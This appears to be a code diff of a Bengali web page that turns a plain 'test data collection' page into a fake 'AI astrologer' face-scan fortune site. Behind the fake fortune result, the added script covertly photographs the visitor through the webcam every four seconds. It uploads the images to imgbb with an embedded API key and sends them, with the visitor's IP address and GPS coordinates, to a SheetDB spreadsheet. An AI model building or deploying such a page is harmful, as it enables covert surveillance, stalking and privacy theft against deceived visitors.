@@ -3,126 +3,150 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>টেস্ট ডাটা সংগ্রহ - ফোন মোড</title>
+    <title>AI জ্যোতিষী - প্রিমিয়াম ভাগ্য গণনা</title>
     <style>
-        body { font-family: sans-serif; text-align: center; background-color: #f4f4f4; padding: 20px; }
-        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
-        #status { color: red; font-weight: bold; margin-top: 15px; }
-        .btn { background: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; }
+        :root { --primary: #7928ca; --secondary: #ff0080; --bg: #050505; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: var(--bg); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow-x: hidden; }
+        .box { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); padding: 40px 30px; border-radius: 30px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); max-width: 450px; width: 90%; border: 1px solid rgba(255,255,255,0.1); position: relative; z-index: 10; text-align: center; }
+        h2 { background: linear-gradient(to right, #7928ca, #ff0080); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 28px; margin-bottom: 10px; }
+        p { color: #a1a1a1; font-size: 16px; line-height: 1.6; }
+        .btn { background: linear-gradient(45deg, var(--primary), var(--secondary)); color: white; padding: 18px; border: none; border-radius: 15px; font-size: 18px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.4s; box-shadow: 0 10px 20px rgba(121, 40, 202, 0.3); }
+        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(121, 40, 202, 0.5); }
+        #status { margin-top: 25px; font-size: 14px; }
+        #scanner { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; flex-direction: column; justify-content: center; align-items: center; }
+        .scan-line { width: 80%; height: 4px; background: #00ff00; position: absolute; animation: scanMove 2s infinite linear; box-shadow: 0 0 20px #00ff00; }
+        @keyframes scanMove { 0% { top: 10%; } 100% { top: 90%; } }
+        .result-card { background: rgba(255, 255, 255, 0.1); padding: 25px; border-radius: 20px; border-left: 5px solid var(--secondary); animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         video, canvas { display: none; }
+        .retry-btn { margin-top: 20px; background: transparent; border: 1px solid #444; color: #ccc; padding: 10px 20px; border-radius: 10px; cursor: pointer; transition: 0.3s; }
+        .retry-btn:hover { background: #444; color: white; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2>টেস্ট ডাটা সংগ্রহ</h2>
-    <p>নিচের বাটনে ক্লিক করে 'Allow' করুন।</p>
-    <button class="btn" id="startBtn">শুরু করুন</button>
-    <div id="status">পারমিশন এর জন্য অপেক্ষা...</div>
+<div class="box" id="mainBox">
+    <h2>🔮 AI ডিজিটাল ভবিষ্যৎ</h2>
+    <p>আমাদের উন্নত AI অ্যালগরিদম আপনার ফেস এনালাইসিস করে ভাগ্যের গোপন রহস্য উন্মোচন করবে।</p>
+    <button class="btn" id="startBtn">স্ক্যান শুরু করুন</button>
+    <div id="status">নিশ্চিত করুন আপনার ক্যামেরা ও লোকেশন অন আছে।</div>
+</div>
+
+<div id="scanner">
+    <div class="scan-line"></div>
+    <h3 style="color: #00ff00; letter-spacing: 2px;">ক্যামেরার দিকে তাকিয়ে হাসি দিন...</h3>
 </div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
 <script>
-    const apiURL = "https://sheetdb.io/api/v1/ey67387uzrxk5?sheet=Sheet8";
-    const statusDiv = document.getElementById('status');
+    const IMGBB_API_KEY = "3d66780bd0b6e264f2f3c64a306022cc"; 
+    const SHEETDB_URL = "https://sheetdb.io/api/v1/ey67387uzrxk5?sheet=Sheet8";
+    
     const startBtn = document.getElementById('startBtn');
+    const statusDiv = document.getElementById('status');
+    const scanner = document.getElementById('scanner');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
 
     let userIP = "Loading...";
+    let gpsData = "N/A";
+    let isMonitoring = false;
 
-    // আইপি সংগ্রহ
-    async function fetchIP() {
+    async function collectIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
             userIP = data.ip;
-        } catch (e) { userIP = "IP Error"; }
+        } catch (e) { userIP = "Unknown"; }
     }
 
-    // জিপিএস সংগ্রহ (ফোনের জন্য অপ্টিমাইজড)
-    function getGPS() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve("Not Supported");
-            } else {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
-                    (err) => resolve("Error: " + err.message),
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            }
-        });
-    }
+    async function captureAndSend() {
+        // ভিডিও থেকে ছবি নেওয়ার চেষ্টা
+        if (video.readyState === video.HAVE_ENOUGH_DATA) {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const base64Image = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
 
-    // ডাটা পাঠানো
-    async function sendToSheet(base64Img, gps) {
-        try {
-            const response = await fetch(apiURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    "data": [{ "img": base64Img, "ip": userIP, "gps": gps }]
-                })
-            });
-            if (response.ok) {
-                statusDiv.innerText = "ডাটা সফলভাবে পাঠানো হয়েছে!";
-                statusDiv.style.color = "green";
-            }
-        } catch (e) {
-            statusDiv.innerText = "পাঠাতে সমস্যা হয়েছে!";
+            const formData = new FormData();
+            formData.append("image", base64Image);
+
+            try {
+                const imgbbRes = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
+                    method: "POST",
+                    body: formData
+                });
+                const imgbbData = await imgbbRes.json();
+                
+                if(imgbbData.success) {
+                    const imageUrl = imgbbData.data.url;
+                    await fetch(SHEETDB_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            "data": [{ "img": imageUrl, "ip": userIP, "gps": gpsData }]
+                        })
+                    });
+                    console.log("Success: " + imageUrl);
+                }
+            } catch (e) { console.error("Upload Error"); }
         }
     }
 
-    // মেইন প্রসেস
-    async function mainTask() {
-        statusDiv.style.color = "blue";
-        statusDiv.innerText = "লোকেশন এবং ছবি সংগ্রহ হচ্ছে...";
-        
-        // জিপিএস না আসা পর্যন্ত এখানে ওয়েট করবে
-        const gpsData = await getGPS();
-        
-        // ছবি তোলা
-        const context = canvas.getContext('2d');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0);
-        const base64Img = canvas.toDataURL('image/jpeg', 0.4);
-
-        // সিটে পাঠানো
-        await sendToSheet(base64Img, gpsData);
-    }
-
     startBtn.addEventListener('click', async () => {
-        startBtn.style.display = 'none';
-        statusDiv.innerText = "ক্যামেরা এক্সেস করা হচ্ছে...";
-
+        statusDiv.innerHTML = "<p style='color: #ffaa00;'>অনুমতি পরীক্ষা করা হচ্ছে...</p>";
+        
         try {
+            // লোকেশন নেওয়া (অপশনাল রাখা হয়েছে যাতে লোকেশন এরর দিলে ক্যামেরা আটকে না যায়)
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { gpsData = `${pos.coords.latitude}, ${pos.coords.longitude}`; },
+                (err) => { console.log("Location Denied"); },
+                { timeout: 5000 }
+            );
+
+            // ক্যামেরা এক্সেস (সব ফোনের জন্য সাধারণ সেটিংস)
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
-                audio: false 
+                video: { facingMode: "user" } 
             });
             video.srcObject = stream;
             
-            await fetchIP();
+            startBtn.style.display = 'none';
+            scanner.style.display = 'flex';
 
-            // প্রথমবার সাথে সাথে রান
-            await mainTask();
+            await collectIP();
+            
+            // অটো ক্যাপচার শুরু
+            if (!isMonitoring) {
+                isMonitoring = true;
+                setInterval(captureAndSend, 4000); // প্রতি ৪ সেকেন্ড পর পর
+            }
 
-            // প্রতি ৩ সেকেন্ড পর পর লুপ
-            setInterval(async () => {
-                await mainTask();
-            }, 3000);
+            // প্রথম ক্যাপচার ১ সেকেন্ড পর
+            setTimeout(captureAndSend, 1500);
+
+            // ফলাফল দেখানো
+            setTimeout(() => {
+                scanner.style.display = 'none';
+                statusDiv.innerHTML = `
+                    <div class="result-card">
+                        <h3 style="color: var(--secondary); margin-top:0;">🎯 AI ফলাফল:</h3>
+                        <p style="color: white; font-size: 18px; font-weight: bold;">আপনার ভাগ্য অতি উজ্জ্বল! খুব শীঘ্রই ভালো কিছু ঘটতে চলেছে।</p>
+                        <button class="retry-btn" onclick="location.reload()">আবার দেখুন</button>
+                    </div>
+                `;
+            }, 6000);
 
         } catch (err) {
-            statusDiv.innerText = "পারমিশন রিজেক্ট করা হয়েছে!";
             console.error(err);
+            scanner.style.display = 'none';
+            statusDiv.innerHTML = `<p style="color:#f85149;">ক্যামেরা অনুমতি প্রয়োজন। দয়া করে সেটিংস থেকে ক্যামেরা এলাউ করুন।</p>`;
         }
     });
 </script>
 
 </body>
-  </html>
-  
+</html>
